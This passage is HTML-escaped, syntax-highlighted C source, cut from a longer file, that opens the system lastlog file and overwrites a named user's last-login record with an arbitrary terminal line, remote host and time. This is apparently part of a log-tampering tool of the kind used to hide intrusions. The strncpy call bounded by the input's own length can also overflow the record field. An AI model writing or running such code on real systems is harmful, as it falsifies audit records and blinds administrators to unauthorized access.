&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Open the lastlog file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LASTLOG_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDWR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LASTLOG_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getpwnam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Can&amp;#39;t find user in passwd.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pw_uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lastlog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;bzero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;cm&#34;&gt;/* YYMMddhhmm */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Time format is YYMMddhhmm.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;		 * Extract Times.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;		 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm_year&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm_mon&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm_mday&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm_hour&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm_min&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm_sec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll_time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mktime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll_host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll_host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
